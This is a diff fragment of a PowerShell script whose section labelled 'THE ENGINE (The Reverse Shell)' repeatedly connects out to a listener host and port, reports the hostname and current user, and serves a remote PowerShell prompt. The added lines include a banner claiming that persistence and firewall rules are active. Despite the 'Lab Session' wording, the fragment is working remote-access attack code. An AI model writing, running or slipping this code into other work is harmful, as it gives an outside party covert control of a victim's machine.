@@ -42,14 +42,17 @@ if (Test-Path $FullPath) {
 # 2. THE ENGINE (The Reverse Shell)
 while ($true) {
     try {
+        # Attempt connection
         $client = New-Object System.Net.Sockets.TCPClient($LHOST, $LPORT)
         $stream = $client.GetStream()
         $reader = New-Object System.IO.StreamReader($stream)
         $writer = New-Object System.IO.StreamWriter($stream)
         $writer.AutoFlush = $true
 
+        # Initial banner to confirm execution
         $writer.WriteLine("--- Lab Session Established: $(hostname) ---")
         $writer.WriteLine("--- Running as: $(whoami) ---")
+        $writer.WriteLine("--- Persistence and Firewall Rules Active ---")
         
         while ($client.Connected) {
             $writer.Write("PS " + (Get-Location).Path + "> ")
